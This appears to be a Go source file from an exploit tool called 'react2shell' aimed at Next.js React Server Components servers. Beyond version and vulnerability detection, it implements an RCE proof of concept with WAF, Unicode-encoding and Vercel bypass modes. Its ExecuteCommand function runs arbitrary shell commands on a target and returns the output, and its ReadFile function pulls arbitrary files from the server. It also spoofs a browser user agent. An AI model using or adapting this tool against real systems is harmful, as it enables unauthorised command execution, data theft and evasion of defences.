package scanner

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"regexp"
	"strings"
	"time"

	"github.com/react2shell/scanner/internal/client"
	"github.com/react2shell/scanner/internal/payload"
	"github.com/react2shell/scanner/pkg/models"
	"github.com/react2shell/scanner/pkg/utils"
)

type Scanner interface {
	ScanVersion(ctx context.Context, url string) (*models.ScanResult, error)
	ScanSafe(ctx context.Context, url string) (*models.ScanResult, error)
	ScanRCE(ctx context.Context, url string, opts *models.ScanOptions) (*models.ScanResult, error)
	ScanComprehensive(ctx context.Context, url string, opts *models.ScanOptions) (*models.ScanResult, error)
	ExecuteCommand(ctx context.Context, url string, command string, opts *models.ScanOptions) (bool, string, error)
	ReadFile(ctx context.Context, url string, filepath string, opts *models.ScanOptions) (bool, string, error)
}

type nextJSScanner struct {
	client    client.HTTPClient
	userAgent string
}

func NewScanner(httpClient client.HTTPClient, userAgent string) Scanner {
	if userAgent == "" {
		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	}
	return &nextJSScanner{
		client:    httpClient,
		userAgent: userAgent,
	}
}

func (s *nextJSScanner) getHeaders(contentType string) map[string]string {
	headers := map[string]string{
		"User-Agent":              s.userAgent,
		"Next-Action":             "x",
		"X-Nextjs-Request-Id":     fmt.Sprintf("scan-%d", rand.Intn(9000)+1000),
		"X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
	}
	if contentType != "" {
		headers["Content-Type"] = contentType
	}
	return headers
}

func (s *nextJSScanner) ScanVersion(ctx context.Context, url string) (*models.ScanResult, error) {
	result := &models.ScanResult{
		URL:             url,
		DetectionMethod: "http_headers",
		Timestamp:       time.Now(),
	}

	url = utils.NormalizeURL(url)
	if url == "" {
		result.Error = "Invalid URL"
		return result, nil
	}

	headers := map[string]string{"User-Agent": s.userAgent}
	resp, err := s.client.Get(ctx, url, headers)
	if err != nil {
		result.Error = err.Error()
		return result, nil
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode

	xPoweredBy := resp.Header.Get("X-Powered-By")
	if strings.Contains(xPoweredBy, "Next.js") {
		re := regexp.MustCompile(`Next\.js\s+([0-9.]+(?:-canary\.\d+)?)`)
		matches := re.FindStringSubmatch(xPoweredBy)
		if len(matches) > 1 {
			result.Version = matches[1]
		}
	}

	vary := resp.Header.Get("Vary")
	hasRSC := strings.Contains(vary, "RSC") || strings.Contains(vary, "Next-Router-State-Tree")

	rscHeaders := map[string]string{
		"User-Agent": s.userAgent,
		"RSC":        "1",
	}
	rscResp, err := s.client.Get(ctx, url, rscHeaders)
	if err == nil {
		defer rscResp.Body.Close()
		contentType := rscResp.Header.Get("Content-Type")
		isRSC := strings.HasPrefix(contentType, "text/x-component")

		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyText := string(bodyBytes)

		if result.Version == "" {
			buildRe := regexp.MustCompile(`"buildId"\s*:\s*"([^"]+)"`)
			if buildRe.MatchString(bodyText) {
				result.DetectionMethod = "build_id"
			}

			if strings.Contains(bodyText, "/_next/") || strings.Contains(bodyText, "__next") {
				result.Version = "detected (version unknown)"
			}
		}

		if result.Version != "" && result.Version != "detected (version unknown)" {
			vuln, _ := utils.IsVulnerable(result.Version)
			v := vuln
			result.Vulnerable = &v
		} else if hasRSC || isRSC {
			if result.Version == "" {
				result.Version = "RSC detected (version unknown)"
			}
			result.Vulnerable = nil
		}
	}

	return result, nil
}

func (s *nextJSScanner) ScanSafe(ctx context.Context, url string) (*models.ScanResult, error) {
	result := &models.ScanResult{
		URL:             url,
		DetectionMethod: "safe_side_channel",
		Timestamp:       time.Now(),
	}

	url = utils.NormalizeURL(url)
	if url == "" {
		result.Error = "Invalid URL"
		return result, nil
	}

	builder := payload.NewSafeBuilder()
	pl := builder.Build()
	headers := s.getHeaders(pl.ContentType)

	bodyReader := strings.NewReader(pl.Body)
	resp, err := s.client.Post(ctx, url+"/", headers, bodyReader)
	if err != nil {
		result.Error = err.Error()
		return result, nil
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode
	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyText := string(bodyBytes)
	if len(bodyText) > 2000 {
		result.RawResponse = bodyText[:2000]
	} else {
		result.RawResponse = bodyText
	}

	if resp.StatusCode == 500 && strings.Contains(bodyText, "E{\"digest\"") {
		server := strings.ToLower(resp.Header.Get("Server"))
		hasNetlify := resp.Header.Get("Netlify-Vary") != ""

		if strings.Contains(server, "vercel") || strings.Contains(server, "netlify") || hasNetlify {
			v := false
			result.Vulnerable = &v
			result.WAFDetected = true
		} else {
			v := true
			result.Vulnerable = &v
		}
	} else if resp.StatusCode == 403 {
		result.WAFDetected = true
		result.Vulnerable = nil
	} else {
		v := false
		result.Vulnerable = &v
	}

	return result, nil
}

func (s *nextJSScanner) ScanRCE(ctx context.Context, url string, opts *models.ScanOptions) (*models.ScanResult, error) {
	result := &models.ScanResult{
		URL:             url,
		DetectionMethod: "rce_poc",
		Timestamp:       time.Now(),
	}

	url = utils.NormalizeURL(url)
	if url == "" {
		result.Error = "Invalid URL"
		return result, nil
	}

	builder := payload.NewRCEBuilder().
		SetWindows(opts.Windows).
		SetWAFBypass(opts.WAFBypass, opts.WAFBypassSizeKB).
		SetUnicodeEncode(opts.UnicodeEncode).
		SetVercelBypass(opts.VercelBypass)

	pl := builder.Build()

	if opts.VercelBypass {
		result.DetectionMethod = "rce_poc_vercel_bypass"
	} else if opts.WAFBypass {
		result.DetectionMethod = "rce_poc_waf_bypass"
	} else if opts.UnicodeEncode {
		result.DetectionMethod = "rce_poc_unicode"
	}

	headers := s.getHeaders(pl.ContentType)
	bodyReader := strings.NewReader(pl.Body)

	resp, err := s.client.Post(ctx, url+"/", headers, bodyReader)
	if err != nil {
		result.Error = err.Error()
		return result, nil
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode
	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyText := string(bodyBytes)
	if len(bodyText) > 2000 {
		result.RawResponse = bodyText[:2000]
	} else {
		result.RawResponse = bodyText
	}

	redirectHeader := resp.Header.Get("X-Action-Redirect")
	location := resp.Header.Get("Location")

	redirectMatch := regexp.MustCompile(`.*/login\?a=11111.*`)
	if redirectMatch.MatchString(redirectHeader) || redirectMatch.MatchString(location) {
		v := true
		result.Vulnerable = &v
		if opts.WAFBypass || opts.UnicodeEncode || opts.VercelBypass {
			result.WAFBypassed = true
		}
	} else if resp.StatusCode == 403 {
		result.WAFDetected = true
		result.Vulnerable = nil
	} else {
		v := false
		result.Vulnerable = &v
	}

	return result, nil
}

func (s *nextJSScanner) ScanComprehensive(ctx context.Context, url string, opts *models.ScanOptions) (*models.ScanResult, error) {
	url = utils.NormalizeURL(url)

	versionResult, _ := s.ScanVersion(ctx, url)
	safeResult, _ := s.ScanSafe(ctx, url)

	if safeResult.Vulnerable != nil && *safeResult.Vulnerable {
		safeResult.Version = versionResult.Version
		safeResult.DetectionMethod = "safe_side_channel"
		return safeResult, nil
	}

	if safeResult.WAFDetected && opts != nil {
		rceResult, _ := s.ScanRCE(ctx, url, opts)
		if rceResult.Vulnerable != nil && *rceResult.Vulnerable {
			rceResult.Version = versionResult.Version
			return rceResult, nil
		}

		optsCopy := *opts
		optsCopy.WAFBypass = true
		rceResult, _ = s.ScanRCE(ctx, url, &optsCopy)
		if rceResult.Vulnerable != nil && *rceResult.Vulnerable {
			rceResult.Version = versionResult.Version
			return rceResult, nil
		}

		optsCopy = *opts
		optsCopy.UnicodeEncode = true
		rceResult, _ = s.ScanRCE(ctx, url, &optsCopy)
		if rceResult.Vulnerable != nil && *rceResult.Vulnerable {
			rceResult.Version = versionResult.Version
			return rceResult, nil
		}
	}

	if versionResult.Version != "" {
		versionResult.WAFDetected = safeResult.WAFDetected
		vuln, _ := utils.IsVulnerable(versionResult.Version)
		if vuln {
			v := !safeResult.WAFDetected
			versionResult.Vulnerable = &v
		} else {
			v := false
			versionResult.Vulnerable = &v
		}
		return versionResult, nil
	}

	return safeResult, nil
}

func (s *nextJSScanner) ExecuteCommand(ctx context.Context, url string, command string, opts *models.ScanOptions) (bool, string, error) {
	url = utils.NormalizeURL(url)
	if url == "" {
		return false, "", fmt.Errorf("invalid URL")
	}

	builder := payload.NewExploitBuilder().
		SetCommand(command).
		SetWindows(opts.Windows).
		SetWAFBypass(opts.WAFBypass, opts.WAFBypassSizeKB).
		SetUnicodeEncode(opts.UnicodeEncode)

	pl := builder.Build()
	headers := s.getHeaders(pl.ContentType)
	bodyReader := strings.NewReader(pl.Body)

	resp, err := s.client.Post(ctx, url+"/", headers, bodyReader)
	if err != nil {
		return false, "", err
	}
	defer resp.Body.Close()

	redirectHeader := resp.Header.Get("X-Action-Redirect")
	location := resp.Header.Get("Location")

	outputRe := regexp.MustCompile(`[?&]out=([^&;]+)`)
	matches := outputRe.FindStringSubmatch(redirectHeader + location)
	if len(matches) > 1 {
		return true, matches[1], nil
	}

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyText := string(bodyBytes)
	bodyMatch := outputRe.FindStringSubmatch(bodyText)
	if len(bodyMatch) > 1 {
		return true, bodyMatch[1], nil
	}

	if resp.StatusCode == 403 {
		return false, "WAF blocked the request (403 Forbidden)", nil
	} else if resp.StatusCode == 500 {
		return false, "Server error - command may have failed or syntax error", nil
	}

	return false, fmt.Sprintf("No output captured (Status: %d)", resp.StatusCode), nil
}

func (s *nextJSScanner) ReadFile(ctx context.Context, url string, filepath string, opts *models.ScanOptions) (bool, string, error) {
	url = utils.NormalizeURL(url)
	if url == "" {
		return false, "", fmt.Errorf("invalid URL")
	}

	builder := payload.NewFileReadBuilder().
		SetFilePath(filepath).
		SetWAFBypass(opts.WAFBypass, opts.WAFBypassSizeKB).
		SetUnicodeEncode(opts.UnicodeEncode)

	pl := builder.Build()
	headers := s.getHeaders(pl.ContentType)
	bodyReader := strings.NewReader(pl.Body)

	resp, err := s.client.Post(ctx, url+"/", headers, bodyReader)
	if err != nil {
		return false, "", err
	}
	defer resp.Body.Close()

	redirectHeader := resp.Header.Get("X-Action-Redirect")
	location := resp.Header.Get("Location")

	outputRe := regexp.MustCompile(`[?&]out=([^&;]+)`)
	matches := outputRe.FindStringSubmatch(redirectHeader + location)
	if len(matches) > 1 {
		return true, matches[1], nil
	}

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyText := string(bodyBytes)
	bodyMatch := outputRe.FindStringSubmatch(bodyText)
	if len(bodyMatch) > 1 {
		return true, bodyMatch[1], nil
	}

	if resp.StatusCode == 403 {
		return false, "WAF blocked the request", nil
	}

	return false, fmt.Sprintf("File read failed (Status: %d)", resp.StatusCode), nil
}

